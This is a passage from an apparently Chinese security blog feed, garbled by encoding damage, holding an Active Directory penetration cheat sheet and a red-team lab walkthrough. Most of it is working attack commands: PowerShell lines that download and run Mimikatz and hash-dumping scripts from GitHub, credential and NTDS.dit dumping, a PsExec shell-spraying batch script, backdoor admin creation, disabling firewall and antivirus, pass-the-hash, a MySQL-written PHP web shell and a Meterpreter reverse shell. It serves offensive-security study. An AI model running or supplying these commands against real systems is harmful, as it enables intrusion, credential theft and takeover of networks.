title="DNSå®šä½åŸŸæ§åˆ¶å™¨"></a>DNSå®šä½åŸŸæ§åˆ¶å™¨</h3><p>DNSè´Ÿè´£å°†åŸŸåè§£ææˆIPåœ°å€</p><p>å†…ç½‘çš„DNSåˆ™å¯ä»¥å®šä½DCï¼ŒåŸŸä¼šæœ‰åç§°ï¼Œæ¯”å¦‚domaintestã€‚åŸŸä¼šå‘DNSæ³¨å†Œè¿™ä¸ªåç§°ï¼Œå³SRVè®°å½•ã€‚åŸŸä¸­çš„è®¡ç®—æœºè®¿é—®SRVæ¥è¿›è€Œè®¿é—®DCã€‚</p><p>é€šå¸¸DNSå’ŒDCä¼šå®‰è£…åœ¨åŒä¸€è®¡ç®—æœºä¸Šï¼Œå› è€Œæ­¤è®¡ç®—çš„æœ¬åœ°è¿æ¥DNSè¦æŒ‡å‘è‡ªèº«ã€‚</p><h2 id="åŸŸæ¸—é€æ€è·¯"><a href="#åŸŸæ¸—é€æ€è·¯" class="headerlink" title="åŸŸæ¸—é€æ€è·¯"></a>åŸŸæ¸—é€æ€è·¯</h2><p> é€šè¿‡åŸŸæˆå‘˜ä¸»æœºï¼Œå®šä½å‡ºåŸŸæ§åˆ¶å™¨IPåŠåŸŸç®¡ç†å‘˜è´¦å·ï¼Œåˆ©ç”¨åŸŸæˆå‘˜ä¸»æœºä½œä¸ºè·³æ¿ï¼Œæ‰©å¤§æ¸—é€èŒƒå›´ï¼Œåˆ©ç”¨åŸŸç®¡ç†å‘˜å¯ä»¥ç™»é™†åŸŸä¸­ä»»ä½•æˆå‘˜ä¸»æœºçš„ç‰¹æ€§ï¼Œå®šä½å‡ºåŸŸç®¡ç†å‘˜ç™»é™†è¿‡çš„ä¸»æœºIPï¼Œè®¾æ³•ä»<strong>åŸŸæˆå‘˜ä¸»æœºå†…å­˜ä¸­</strong>dumpå‡ºåŸŸç®¡ç†å‘˜å¯†ç ï¼Œè¿›è€Œæ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ã€æ¸—é€æ•´ä¸ªå†…ç½‘ã€‚ </p><h2 id="åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤"><a href="#åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤" class="headerlink" title="åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤"></a>åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><pre><code>dsquery server #å¾—åˆ°åŸŸæ§åˆ¶å™¨çš„IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p><p><code>net group &quot;domain controllers&quot; /domain</code>: å¾—åˆ°åŸŸæ§åˆ¶å™¨ä¸»æœºå </p><p> æ³¨æ„é€šè¿‡è¯¥æŒ‡ä»¤å¾—åˆ°çš„æœºå™¨ååé¢ä¼šå¤šä¸€ä¸ª$ç¬¦å·</p><p><code>net group &quot;domain admins&quot; /domain</code>  : æŸ¥è¯¢åŸŸç®¡ç†ç”¨æˆ· </p><p><code>net user /domain</code>æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·</p><p><code>net config workstation</code> : æŸ¥è¯¢å½“å‰ç™»é™†åŸŸ </p><p><code>net accounts /domain</code>:  æŸ¥è¯¢åŸŸå¯†ç ç­–ç•¥ </p><p><code>wmic qfe</code> : æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯ </p><p><code>wmic os</code>:  æŸ¥çœ‹æ“ä½œç³»ç»Ÿç±»å‹ </p><p><code>ipconfig /all</code>æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</p><p><code>tasklist /S ip /U domain\username /P /V</code>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºè¿›ç¨‹åˆ—è¡¨</p><p> æœ‰ä¸€ä¸ªç‰¹æ®Šç”¨æˆ·å«åškrbtgtï¼Œè¯¥ç”¨æˆ·æ˜¯ç”¨äºKerberosèº«ä»½éªŒè¯çš„å¸æˆ·ï¼Œè·å¾—äº†è¯¥ç”¨æˆ·çš„hashï¼Œå°±å¯ä»¥ä¼ªé€ ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’æ”»å‡»äº† </p><h4 id="æ‰¹é‡æŸ¥æ‰¾-åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº"><a href="#æ‰¹é‡æŸ¥æ‰¾-åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº" class="headerlink" title="æ‰¹é‡æŸ¥æ‰¾ åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº"></a>æ‰¹é‡æŸ¥æ‰¾ åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº</h4><pre><code class="bat">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt:endexit</code></pre><h4 id="æ‰¹é‡åå¼¹cmdshell"><a href="#æ‰¹é‡åå¼¹cmdshell" class="headerlink" title="æ‰¹é‡åå¼¹cmdshell"></a>æ‰¹é‡åå¼¹cmdshell</h4><pre><code class="cmd">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd:endexit</code></pre><h3 id="è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº"><a href="#è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº" class="headerlink" title="è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº"></a>è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº</h3><p> net useå»ºç«‹Ipc$è¿æ¥ã€wmicæŒ‡ä»¤è¿æ¥ã€é‡‡ç”¨rdpæ–¹å¼è¿æ¥ , psexecè¿›è¡Œè¿œç¨‹è¿æ¥ </p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p><p><code>net use \\ip\ipc$ pawword /user:username</code>å»ºç«‹IPCä¼šè¯</p><h3 id="æŠ“å–å†…å­˜ä¸­çš„hash-å¯†ç "><a href="#æŠ“å–å†…å­˜ä¸­çš„hash-å¯†ç " class="headerlink" title="æŠ“å–å†…å­˜ä¸­çš„hash/å¯†ç "></a>æŠ“å–å†…å­˜ä¸­çš„hash/å¯†ç </h3><p>æŠ“æ˜æ–‡</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="æ™®é€šhash"><a href="#æ™®é€šhash" class="headerlink" title="æ™®é€šhash"></a>æ™®é€šhash</h4><p>æŠ“hash</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>æŠ“å–æ˜æ–‡:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p><p>æŠ“å–hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p><h4 id="åŸŸhash"><a href="#åŸŸhash" class="headerlink" title="åŸŸhash"></a>åŸŸhash</h4><p>NTDS.ditè·å–åŸŸæ§hash</p><p>è¿™ä¸ªæ€è·¯åœ¨åŸŸæ¸—é€ä¸­å°¤ä¸ºé‡è¦ï¼Œå› ä¸ºè¿™é‡Œé¢åŒ…å«ç€æ‰€æœ‰åŸŸç”¨æˆ·çš„hashï¼Œå½“ç„¶è¯¥æ€è·¯åªå¯¹DCç”Ÿæ•ˆã€‚</p><p>æ‰‹åŠ¨å¯¼å‡ºNTDS.ditå’ŒSystem-hiveï¼Œæœ¬åœ°æˆ–ç›®æ ‡æœºå¯¼hashï¼Œå› ä¸ºï¼Œå¦‚æœåŸŸè¶³å¤Ÿå¤§ï¼Œè¯¥æ–‡ä»¶ä¹Ÿä¼šç‰¹åˆ«å¤§ã€‚</p><p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p><p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:æ³¨æ„-d ä¸ºntds.ditè·¯å¾„,-sä¸ºsystem(å¯¼å‡ºçš„)è·¯å¾„</p><p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p><pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit localpython secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p><p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p><h3 id="æ·»åŠ ç”¨æˆ·"><a href="#æ·»åŠ ç”¨æˆ·" class="headerlink" title="æ·»åŠ ç”¨æˆ·"></a>æ·»åŠ ç”¨æˆ·</h3><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h3 id="åŸŸæ§æå–åŸŸç”¨æˆ·hash"><a href="#åŸŸæ§æå–åŸŸç”¨æˆ·hash" class="headerlink" title="åŸŸæ§æå–åŸŸç”¨æˆ·hash"></a>åŸŸæ§æå–åŸŸç”¨æˆ·hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exeæ˜¯åŸŸæ§åˆ¶å™¨è‡ªå¸¦çš„åŸŸæ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œä»windows 2008å°±é»˜è®¤è‡ªå¸¦äº† </p><pre><code>Ntdsutil     snapshotâ€”activate instance ntds    create    mount {guid}copy è£…è½½ç‚¹\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p><p> æœ€åæ‰§è¡Œ </p><pre><code>unmount {guid}delete {guid}quit</code></pre><p> åˆ é™¤è£…è½½ç‚¹å³å¯ï¼Œé¿å…è¢«å‘ç° </p><p>æ¥ç€ä¸Šä¼ å·¥å…·QuarksPwDumpåˆ°åŸŸæ§åˆ¶å™¨ä¸Šï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸæå–ç”¨æˆ·hash</p><p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p><h3 id="å…³é—­é˜²ç«å¢™"><a href="#å…³é—­é˜²ç«å¢™" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h3><pre><code>netsh advfirewall set allprofiles state off#å…³é—­é˜²ç«å¢™net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#å…³é—­DEPmeterpreter &gt; run killav  å…³é—­æ€æ¯’è½¯ä»¶ </code></pre><h2 id="ç¥¨æ®ä¼ é€’æ”»å‡»"><a href="#ç¥¨æ®ä¼ é€’æ”»å‡»" class="headerlink" title="ç¥¨æ®ä¼ é€’æ”»å‡»"></a>ç¥¨æ®ä¼ é€’æ”»å‡»</h2><p> åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„Ticketéƒ½æ˜¯ç”±krbtgtçš„å¯†ç Hashæ¥è®¡ç®—ç”Ÿæˆçš„ï¼Œå› æ­¤åªè¦æˆ‘ä»¬æ‹¿åˆ°äº†krbtgtçš„å¯†ç Hashï¼Œå°±å¯ä»¥éšæ„ä¼ªé€ Ticketï¼Œè¿›è€Œä½¿ç”¨Ticketç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨krbtgtç”¨æˆ·hashç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸ºGolden Ticketï¼Œæ­¤ç±»æ”»å‡»æ–¹æ³•è¢«ç§°ä¸ºç¥¨æ®ä¼ é€’æ”»å‡»ã€‚ </p><h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> å¾®è½¯ç»™å‡ºçš„è¡¥ä¸æ˜¯kb3011780ï¼Œåœ¨server 2000ä»¥ä¸Šçš„åŸŸæ§ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ‰“è¿™ä¸ªè¡¥ä¸ï¼Œé‚£ä¹ˆæƒ…å†µå°†æ¯”è¾ƒç³Ÿç³•ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å°†ä»»ä½•ä¸€ä¸ªåŸŸç”¨æˆ·ææƒè‡³åŸŸç®¡ç†å‘˜æƒé™ï¼Œå±å®³æå¤§ã€‚ </p><h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>ç›®æ ‡:192.168.52.138</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexecset lhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138orpython smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138</code></pre><p>æ˜¾ç„¶ï¼Œå…¶å®å®ƒåªéœ€è¦NThashéƒ¨åˆ†å°±å¥½å•¦ã€‚</p><h2 id="copy-äº"><a href="#copy-äº" class="headerlink" title="copy äº"></a>copy äº</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p><p> <a href="https://zhengbao.wang/åŸŸæ¸—é€åŸºç¡€/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p><p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/17/åŸŸæ¸—é€/">https://explorersss.github.io/2020/02/17/åŸŸæ¸—é€/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸæ¸—é€ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•</title>
      <link href="/2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnstackATT-amp-CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•"><a href="#vulnstackATT-amp-CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•" class="headerlink" title="vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•"></a>vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><p>å·²çŸ¥é¶æœºåœ¨192.168.2.*ä¸Š</p><pre><code>[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)</code></pre><p>ç›®æ ‡å°±æ˜¯192.168.2.142</p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><pre><code>[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Host is up (0.00062s latency).[*] Nmap: Not shown: 65523 closed ports[*] Nmap: PORT     STATE SERVICE[*] Nmap: 80/tcp   open  http[*] Nmap: 135/tcp  open  msrpc[*] Nmap: 139/tcp  open  netbios-ssn[*] Nmap: 445/tcp  open  microsoft-ds[*] Nmap: 1025/tcp open  NFS-or-IIS[*] Nmap: 1026/tcp open  LSA-or-nterm[*] Nmap: 1027/tcp open  IIS[*] Nmap: 1028/tcp open  unknown[*] Nmap: 1029/tcp open  ms-lsa[*] Nmap: 1030/tcp open  iad1[*] Nmap: 3306/tcp open  mysql[*] Nmap: 3389/tcp open  ms-wbt-server[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)</code></pre><h2 id="webæœåŠ¡"><a href="#webæœåŠ¡" class="headerlink" title="webæœåŠ¡"></a>webæœåŠ¡</h2><p>å…ˆå»çœ‹çœ‹webæœåŠ¡å§</p><pre><code>[10:52:41] 200 -   11B  - /index.php[10:52:45] 200 -   71KB - /phpinfo.php[10:52:45] 200 -    4KB - /phpMyAdmin/[10:52:53] 200 -    2B  - /1.php</code></pre><p>çœ‹äº†ä¸€ä¸‹åªæœ‰phpmyadminæœ‰ç”¨</p><p>è¯•ç€å¼±å¯†ç ç™»é™†,ä¸ç›´æ¥ç”¨mysqlå®¢æˆ·ç«¯ç™»é™†æ˜¯å› ä¸ºæ€•ä»–ä»¬ç¦æ­¢è¿œç¨‹ip</p><p>ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€ä¸ªçˆ†ç ´phpmyadminçš„</p><p><img src="https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png" alt="image1782"></p><p>å¼±å¯†ç ç™»é™†æˆåŠŸ</p><p>å°è¯•sqlå†™shell</p><pre><code>1. select &quot;test&quot; into outfile &quot;C:/phpStudy/WWW/test.php&quot;;2. æ—¥å¿—å†™shellmysql&gt; show variables like &#39;%general%&#39;#å…ˆçœ‹ä¸‹å½“å‰mysqlé»˜è®¤çš„æ—¥å¿—ä½ç½®åœ¨ä»€ä¹ˆåœ°æ–¹,&#39;C:\phpStudy\MySQL\data\stu1.log&#39; é¡ºæ‰‹æŠŠåŸæ¥æ­£å¸¸çš„æ—¥å¿—è·¯å¾„ç¨å¾®è®°å½•ä¸‹,ç­‰ä¼šå„¿å¹²å®Œæ´»å„¿å†æŠŠå®ƒæ¢å¤å›æ¥mysql&gt; set global general_log = on#é»˜è®¤åŸºæœ¬éƒ½æ˜¯å…³é—­çš„,ä¸ç„¶è¿™ä¸ªå¢åˆ æ”¹æŸ¥çš„è®°å½•é‡å¯èƒ½ä¼šéå¸¸å¤§mysql&gt;  set global general_log_file = &#39;C:/phpStudy/WWW/test.php&#39;;#æ­¤æ—¶,å†æŠŠåŸæœ¬çš„æ—¥å¿—æ–‡ä»¶ä½ç½®æŒ‡å‘åˆ°ç›®æ ‡ç½‘ç«™çš„ç‰©ç†è·¯å¾„mysql&gt; select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;#å¼€å§‹å†™shell,è¿™é‡Œå°±æ˜¯ä¸ªæ™®é€šçš„shell,ä¸å…æ€,å¦‚æœæœ‰wafçš„è¯,å¯ä»¥ç”¨ä¸‹é¢çš„å…æ€shell##å†™å®Œä¹‹åè®°å¾—æ¢å¤mysql&gt; set global general_log_file = &#39;C:\phpStudy\MySQL\data\stu1.log&#39;;mysql&gt; set global general_log = off;</code></pre><p><img src="https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png" alt="image2457"></p><p>æˆåŠŸå†™å…¥shell</p><p><img src="https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png" alt="image2535"></p><p>ç›´æ¥æ‹¿åˆ°ç®¡ç†å‘˜æƒé™äº†</p><h2 id="meterpreteråæ”»å‡»"><a href="#meterpreteråæ”»å‡»" class="headerlink" title="meterpreteråæ”»å‡»"></a>meterpreteråæ”»å‡»</h2><pre><code>netsh advfirewall set allprofiles state off#å…³é—­é˜²ç«å¢™net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#å…³é—­DEPmeterpreter &gt; run killav  å…³é—­æ€æ¯’è½¯ä»¶ </code></pre><h2 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h2><pre><code>msfvenom -p php/meterpreter/reverse_tcp -a php -f raw &gt; /tmp/2.phpuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsrun autoroute -s 192.168.52.143msf &gt; use auxiliary/server/socks4a   è®¾ç½®socks4ä»£ç†æ¨¡å—msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; runvim /etc/proxychains.conf   ä¿®æ”¹ä»£ç†ç›‘å¬ç«¯å£,å’Œå‰é¢ç«¯å£ä¸€è‡´</code></pre><p>ç”¨msfè®¾ç½®çš„ä»£ç†ä¸çŸ¥é“ä¸ºå•¥ä¸å¤ªç¨³å®š</p><p>äºæ˜¯æˆ‘ç”¨reGeorgæ¥è®¾ç½®ä»£ç†</p><p>emmmm,è¿˜æ˜¯ewå¥½ç”¨</p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>å› ä¸ºsocksæ— æ³•ä»£ç†icmpåè®®(pingä½¿ç”¨çš„),æ‰€ä»¥nampè¦ç”¨<code>-Pn</code>é€‰é¡¹</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½??Nmap scan report for 192.168.52.138Host is up (0.00s latency).MAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap scan report for 192.168.52.141Host is up (0.00s latency).MAC Address: 00:0C:29:6D:39:34 (VMware)Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds</code></pre><p>æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯<code>192.168.52.138</code>,<code>192.168.52.141</code></p><p>192.168.52.138</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½??Nmap scan report for 192.168.52.138Host is up (0.00031s latency).Not shown: 983 filtered portsPORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPsslMAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds</code></pre><p>Running: Microsoft Windows 7|8|Vista|2008</p><p>192.168.52.141</p><pre><code>21/tcp   open  ftp135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds777/tcp  open  multiling-http1025/tcp open  NFS-or-IIS1026/tcp open  LSA-or-nterm1030/tcp open  iad11031/tcp open  iad26002/tcp open  X11:27001/tcp open  afs3-callback7002/tcp open  afs3-prserver8099/tcp open  unknown</code></pre><p>Running: Microsoft Windows XP|2003</p><p>å¼±å¯†ç ç™»é™†ftp,å‘ç°å•¥ä¹Ÿå¼„ä¸äº†åŠ¨ä¸åŠ¨500</p><p>å› ä¸ºæ“ä½œç³»ç»Ÿæ¯”è¾ƒæ—§,å¯ä»¥è¯•è¯•MS17-010,æˆåŠŸ!</p><p>ä½†æ˜¯åªæœ‰ms17_010_commandæ‰åˆ©ç”¨æˆåŠŸ,åªèƒ½ä¸€æ¬¡ä¸€æ¬¡set commandæ¥æ‰§è¡Œå‘½ä»¤</p><p>åæ¥æ‰¾åˆ°<code>cmd/windows/powershell_bind_tcp</code></p><p>èƒ½ç›´æ¥è¿”å›ä¸€ä¸ªpowershell</p><p>æ·»åŠ ç”¨æˆ·</p><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h2 id="åŸŸæ§"><a href="#åŸŸæ§" class="headerlink" title="åŸŸæ§"></a>åŸŸæ§</h2><pre><code>net group &quot;domain controllers&quot; /domain å¾—åˆ°åŸŸæ§åˆ¶å™¨ä¸»æœºå:OWAwmic qfe æŸ¥è¯¢å®‰è£…è¡¥ä¸http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 net user /domainæŸ¥è¯¢åŸŸæ‰€æœ‰ç”¨æˆ·-------------------------------------------------------------------------------Administrator            gqy                      Guest                    krbtgt                   ligang                   liukaifeng01   </code></pre><p>æ²¡æœ‰å®‰è£…kb3011780,å¯ä»¥å°†ä»»ä½•ä¸€ä¸ªåŸŸç”¨æˆ·ææƒè‡³åŸŸç®¡ç†å‘˜æƒé™</p><p>åŸŸæ§çš„ipæ˜¯:<code>192.168.52.138</code></p><pre><code>Authentication Id : 0 ; 996 (00000000:000003e4)Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089Session           : Service from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-20    msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :         * Username : OWA$     * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 